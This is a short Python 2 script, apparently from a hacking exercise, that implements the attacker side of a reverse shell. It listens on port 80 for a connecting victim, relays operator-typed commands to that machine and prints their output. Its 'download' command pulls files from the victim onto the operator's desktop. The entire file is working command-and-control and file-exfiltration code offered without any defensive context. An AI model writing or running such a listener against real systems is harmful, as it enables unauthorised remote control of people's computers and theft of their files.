'''
Created on Nov 23, 2017

@author: kkim
'''
import socket

def transfer(conn, command):
    conn.send(command)
    f = open('C:\Users\kkim\Desktop\test.png', 'wb')
    while True:
        bits = conn.recv(1024)
        if ' Unable to find out the file' in bits:
            print 'File not found'
            break
        if bits.endswith('DONE'):
            print ' Transfer completed'
            break
        f.write(bits)
    f.close()
    
def connect():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.240.2.129",80))
    s.listen(1)
    print "Listening to 80"
    conn,addr = s.accept()
    print "Connected to ", addr
    while True:
        command = raw_input("Shell>>")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break
        elif 'download' in command:
            transfer(conn, command)
        else:
            conn.send(command)
            print conn.recv(1024)
    print "Terminated"        

def main():
    connect()
    
main()

    